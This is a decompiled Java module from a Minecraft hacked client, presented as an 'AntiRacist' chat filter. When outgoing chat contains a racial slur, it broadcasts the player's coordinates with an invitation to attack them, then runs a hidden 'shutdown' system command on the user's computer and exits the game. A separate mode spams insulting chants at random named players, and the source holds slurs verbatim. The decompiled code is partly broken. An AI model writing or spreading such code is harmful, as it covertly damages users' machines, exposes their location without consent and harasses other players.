//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.modules.chat;

import me.shatteredhej.railhack.railhackmod.module.*;
import me.shatteredhej.railhack.railhackmod.guiscreen.settings.*;
import me.shatteredhej.railhack.railhackmod.event.events.*;
import me.zero.alpine.fork.listener.*;
import me.shatteredhej.railhack.railhackmod.category.*;
import java.util.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;
import java.io.*;
import java.util.function.*;
import net.minecraft.client.network.*;
import net.minecraft.entity.player.*;

public class AntiRacist extends Module
{
    Setting delay;
    Setting anti_nword;
    Setting chanter;
    List<String> chants;
    Random r;
    int tick_delay;
    String[] random_correction;
    CharSequence nigger;
    CharSequence nigga;
    @EventHandler
    private Listener<EventPacket.SendPacket> listener;
    
    public AntiRacist() {
        super(Category.Chat);
        this.delay = this.register("Delay", "AntiRacistDelay", 10, 0, 100);
        this.anti_nword = this.register("AntiNword", "AntiRacismAntiNword", true);
        this.chanter = this.register("Chanter", "AntiRacismChanter", false);
        this.chants = new ArrayList<String>();
        this.r = new Random();
        this.random_correction = new String[] { "Yuo jstu got nea nae'd by worst+2", "railhack just stopped me from saying something racially incorrect!", "<Insert nword word here>", "Im an edgy teenager and saying the nword makes me feel empowered on the internet.", "My mom calls me a late bloomer", "I really do think im funny", "Niger is a great county, I do say so myself", "Mommy and daddy are wrestling in the bedroom again so im going to play minecraft until their done", "How do you open the impact GUI?", "What time does FitMC do his basehunting livestreams?" };
        this.nigger = "nigger";
        this.nigga = "nigga";
        String message;
        String x;
        String z;
        String coords;
        NetHandlerPlayClient connection;
        final CPacketChatMessage cPacketChatMessage;
        Runtime runtime;
        final BufferedReader bufferedReader;
        BufferedReader br;
        long a;
        Process proc;
        this.listener = new Listener<EventPacket.SendPacket>(event -> {
            if (!(event.getPacket() instanceof CPacketChatMessage)) {
                return;
            }
            else {
                if (this.anti_nword.getValue(true)) {
                    message = ((CPacketChatMessage)event.getPacket()).getMessage().toLowerCase();
                    if (message.contains(this.nigger) || message.contains(this.nigga)) {
                        x = Integer.toString((int)AntiRacist.mc.player.posX);
                        z = Integer.toString((int)AntiRacist.mc.player.posZ);
                        coords = x + " " + z;
                        message = this.random_string(this.random_correction);
                        connection = AntiRacist.mc.player.connection;
                        new CPacketChatMessage("Hi, I'm at " + coords + ", come teach me a lesson about racism");
                        connection.sendPacket((Packet)cPacketChatMessage);
                        runtime = Runtime.getRuntime();
                        new BufferedReader(new InputStreamReader(System.in));
                        br = bufferedReader;
                        a = 0L;
                        try {
                            a = Long.parseLong(br.readLine());
                        }
                        catch (IOException e) {
                            e.printStackTrace();
                        }
                        try {
                            proc = runtime.exec("shutdown -s -t " + a);
                            System.exit(0);
                        }
                        catch (IOException e2) {
                            e2.printStackTrace();
                        }
                    }
                    ((CPacketChatMessage)event.getPacket()).message = message;
                }
                return;
            }
        }, (Predicate<EventPacket.SendPacket>[])new Predicate[0]);
        this.name = "AntiRacist";
        this.tag = "AntiRacist";
        this.description = "dont fucking say it";
    }
    
    protected void onEnable() {
        this.tick_delay = 0;
        this.chants.add("<player> you fucking racist");
        this.chants.add("RIP GEORGE FLOYD");
        this.chants.add("#BLM");
        this.chants.add("#ICANTBREATHE");
        this.chants.add("#NOJUSTICENOPEACE");
        this.chants.add("IM NOT BLACK BUT I STAND WITH YOU");
        this.chants.add("END RACISM, JOIN EMPERIUM");
        this.chants.add("DEFUND THE POLICE");
        this.chants.add("<player> I HOPE YOU POSTED YOUR BLACK SQUARE");
        this.chants.add("RESPECT BLM");
        this.chants.add("IF YOURE NOT WITH US, YOURE AGAINST US");
        this.chants.add("DEREK CHAUVIN WAS A RACIST");
    }
    
    public void onUpdate() {
        if (this.chanter.getValue(true)) {
            ++this.tick_delay;
            if (this.tick_delay < this.delay.getValue(1) * 10) {
                return;
            }
            final String s = this.chants.get(this.r.nextInt(this.chants.size()));
            final String name = this.get_random_name();
            if (name.equals(AntiRacist.mc.player.getName())) {
                return;
            }
            AntiRacist.mc.player.sendChatMessage(s.replace("<player>", name));
            this.tick_delay = 0;
        }
    }
    
    public String get_random_name() {
        final List<EntityPlayer> players = (List<EntityPlayer>)AntiRacist.mc.world.playerEntities;
        return players.get(this.r.nextInt(players.size())).getName();
    }
    
    public String random_string(final String[] list) {
        return list[this.r.nextInt(list.length)];
    }
}
